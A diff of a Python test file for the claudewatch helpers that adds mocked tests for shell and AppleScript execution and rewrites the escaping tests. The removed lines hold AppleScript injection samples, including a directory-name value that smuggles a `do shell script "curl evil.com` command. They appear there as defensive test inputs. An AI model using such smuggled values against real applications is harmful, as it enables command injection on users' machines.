@@ -1,57 +1,76 @@
-"""Tests for claudewatch.backend.helpers — especially security-critical escaping."""
+"""Tests for claudewatch.backend.helpers — _shell and escape_applescript."""
 
-from claudewatch.backend.helpers import escape_applescript
+import subprocess
+from unittest.mock import MagicMock, patch
+
+from claudewatch.backend.helpers import _shell, escape_applescript, run_applescript
 
 
-class TestEscapeAppleScript:
-    """Tests for escape_applescript() — prevents AppleScript injection."""
+class TestShell:
+    def test_returns_stdout(self):
+        with patch("claudewatch.backend.helpers.subprocess.run") as mock_run:
+            mock_run.return_value = MagicMock(stdout="  hello world  ")
+            assert _shell("echo hello") == "hello world"
 
-    def test_escapes_double_quotes(self):
+    def test_returns_empty_on_timeout(self):
+        with patch("claudewatch.backend.helpers.subprocess.run", side_effect=subprocess.TimeoutExpired("cmd", 5)):
+            assert _shell("sleep 100") == ""
+
+    def test_returns_empty_on_oserror(self):
+        with patch("claudewatch.backend.helpers.subprocess.run", side_effect=OSError("nope")):
+            assert _shell("bad") == ""
+
+
+class TestRunApplescript:
+    def test_returns_result(self):
+        with patch("claudewatch.backend.helpers.NSAppleScript") as mock_cls:
+            mock_script = MagicMock()
+            mock_result = MagicMock()
+            mock_result.stringValue.return_value = "hello"
+            mock_script.executeAndReturnError_.return_value = (mock_result, None)
+            mock_cls.alloc.return_value.initWithSource_.return_value = mock_script
+
+            assert run_applescript('return "hello"') == "hello"
+
+    def test_returns_empty_on_error(self):
+        with patch("claudewatch.backend.helpers.NSAppleScript") as mock_cls:
+            mock_script = MagicMock()
+            mock_script.executeAndReturnError_.return_value = (None, {"NSAppleScriptErrorMessage": "fail"})
+            mock_cls.alloc.return_value.initWithSource_.return_value = mock_script
+
+            assert run_applescript("bad script") == ""
+
+    def test_returns_empty_when_result_has_no_string_value(self):
+        with patch("claudewatch.backend.helpers.NSAppleScript") as mock_cls:
+            mock_script = MagicMock()
+            mock_result = MagicMock()
+            mock_result.stringValue.return_value = None
+            mock_script.executeAndReturnError_.return_value = (mock_result, None)
+            mock_cls.alloc.return_value.initWithSource_.return_value = mock_script
+
+            assert run_applescript("return 42") == ""
+
+
+class TestEscapeApplescript:
+    def test_escapes_quotes(self):
         assert escape_applescript('hello "world"') == 'hello \\"world\\"'
 
     def test_escapes_backslashes(self):
         assert escape_applescript("path\\to\\file") == "path\\\\to\\\\file"
 
-    def test_escapes_both(self):
-        assert escape_applescript('say "hi\\there"') == 'say \\"hi\\\\there\\"'
-
-    def test_strips_carriage_return(self):
-        """CR could break out of AppleScript string literals."""
-        assert escape_applescript("before\rafter") == "beforeafter"
-
-    def test_strips_newline(self):
-        """Newline could break out of AppleScript string literals."""
-        assert escape_applescript("before\nafter") == "beforeafter"
-
-    def test_strips_null_byte(self):
-        assert escape_applescript("before\x00after") == "beforeafter"
+    def test_strips_control_chars(self):
+        result = escape_applescript("hello\r\nworld\x00test")
+        assert "\r" not in result
+        assert "\n" not in result
+        assert "\x00" not in result
+        assert "hello" in result
+        assert "world" in result
 
     def test_preserves_tabs(self):
-        assert escape_applescript("col1\tcol2") == "col1\tcol2"
-
-    def test_preserves_unicode(self):
-        assert escape_applescript("café ☕") == "café ☕"
+        assert "\t" in escape_applescript("hello\tworld")
 
     def test_empty_string(self):
         assert escape_applescript("") == ""
 
-    def test_injection_attempt_via_cr(self):
-        """Simulate a malicious directory name with embedded CR."""
-        malicious = 'proj\r") & do shell script "curl evil.com'
-        result = escape_applescript(malicious)
-        assert "\r" not in result
-        assert result == 'proj\\") & do shell script \\"curl evil.com'
-
-    def test_injection_attempt_via_quote(self):
-        """Verify quote-based injection is properly escaped."""
-        malicious = 'foo" & do shell script "evil'
-        result = escape_applescript(malicious)
-        assert result == 'foo\\" & do shell script \\"evil'
-
-    def test_all_control_chars_stripped(self):
-        """All ASCII control chars except tab should be removed."""
-        # Build string with all control chars
-        control = "".join(chr(i) for i in range(32))
-        result = escape_applescript(control)
-        # Only tab should survive
-        assert result == "\t"
+    def test_normal_string_unchanged(self):
+        assert escape_applescript("hello world") == "hello world"
